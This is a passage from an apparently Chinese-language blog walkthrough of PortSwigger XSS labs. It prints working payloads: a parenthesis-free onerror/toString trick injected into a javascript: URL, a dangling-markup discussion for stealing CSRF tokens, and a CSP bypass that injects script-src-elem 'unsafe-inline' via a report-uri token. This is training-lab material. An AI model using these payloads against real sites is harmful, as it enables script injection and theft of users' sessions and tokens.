</span></code></pre><h2 id=lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> in a JavaScript URL with some characters blocked</h2><p>反射型但是不再有<code>search</code>服务了。只能通过<code>post</code>界面来达成<p>后端会将 GET 参数渲染出一个 a 元素出来。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTa </span><span style=color:#8fbcbb>href</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"javascript:fetch('/analytics', {method:'post',body:'&LTencodeURIComponent(input)>'}).finally(_ => window.location = '/')"</span><span style=color:#81a1c1>></span><span style=color:#eceff4>Back to Blog</span><span style=color:#81a1c1>&LT/a>
</span></code></pre><p>不过这个编码不用管。毕竟是 javascript 伪协议，提取时会解码一次。简单测试可以知道block掉了空格和括号和分号<p>闭合前半 json，然后就可以通过<code>,</code>运算符的方式执行多个表达式。要绕过括号的限制，只能通过覆盖 js runtime 隐式执行的函数、配合 throw error 来实现。<p><a href=https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource/error_event>onerror</a> 方法用于自定义错误处理，与<code>Error.prepareStackTrace</code>不同的是它仅适用于浏览器。它似乎与<code>EventSource</code>的 onerror 有区别（？<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>/</span><span>post</span><span style=color:#81a1c1>?</span><span>postId</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>5</span><span style=color:#81a1c1>&</span><span style=color:#a3be8c>'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{a:'
</span></code></pre><p>覆盖了<code>onerror</code>和<code>toString</code>。在调用<code>window+''</code>时会隐式执行<code>toString</code>，<code>toString</code>执行触发报错，throw 出一个 1337 被<code>onerror</code>接收成为参数执行。还蛮神奇的u1s1<p>格式化后的 payload 长这样<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#88c0d0>fetch</span><span>(</span><span style=color:#a3be8c>'/analytics'</span><span style=color:#eceff4>, </span><span>{
</span><span>    method</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'post'</span><span style=color:#eceff4>,
</span><span>    body</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'/post?postId=5&'
</span><span>}</span><span style=color:#eceff4>, </span><span style=color:#88c0d0>x </span><span style=color:#81a1c1>= </span><span>x</span><span style=color:#81a1c1>=></span><span>{
</span><span>    </span><span style=color:#81a1c1>throw </span><span style=color:#616e88>/**/
</span><span>    </span><span style=color:#8fbcbb>EventSource</span><span style=color:#81a1c1>.</span><span>onerror </span><span style=color:#81a1c1>= </span><span>alert</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#b48ead>1337
</span><span>}
</span><span style=color:#eceff4>, </span><span>toString </span><span style=color:#81a1c1>= </span><span>x</span><span style=color:#eceff4>, </span><span>window </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>''</span><span style=color:#eceff4>, </span><span>{
</span><span>    a</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>''
</span><span>})</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>finally</span><span>(_</span><span style=color:#81a1c1>=></span><span>window</span><span style=color:#81a1c1>.</span><span>location </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'/'</span><span>)
</span></code></pre><h2 id=lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack>Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</h2><p><code>dangling markup attack</code>翻译为悬空标记攻击，就是在XSS的基础上设置未闭合引号，造成浏览器解析问题以窃取其后的敏感信息（一般是CSRF Token）<p>以前见过一题 CTF 关于<code>dangling markup attack</code>，是在后台记录输入账密的地方故意留下悬空标记，然后等管理员登录后闭合以窃取管理员账密。还是比较有趣的。<p>这题还有一部分是 CSP 问题<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>default-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>;</span><span>object</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'none'</span><span style=color:#eceff4>; </span><span>style</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>; </span><span>script</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>; </span><span>img</span><span style=color:#81a1c1>-</span><span>src </span><span style=color:#a3be8c>'self'</span><span style=color:#eceff4>; </span><span>base</span><span style=color:#81a1c1>-</span><span>uri </span><span style=color:#a3be8c>'none'</span><span style=color:#eceff4>;
</span></code></pre><p>不过并没有用到 bypass 而是直接 CSRF。<h2 id=lab-reflected-xss-protected-by-csp-with-csp-bypass>Lab: Reflected XSS protected by CSP, with CSP bypass</h2><p>CSP: <code>default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=</code><p>注意到CSP携带了一个token参数。可以注入利用<code>script-src-elem</code>来启用内敛脚本。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript></span><span style=color:#88c0d0>alert</span><span style=color:#eceff4>(</span><span style=color:#b48ead>1</span><span style=color:#eceff4>)</span><span style=color:#81a1c1>&LT/script></span><span style=color:#eceff4>&token=;script-src-elem 'unsafe-inline'
</span></code></pre><p><em>感觉不能叫 bypass ，应该是 Injection</em><p>完结喽~</div></div></section>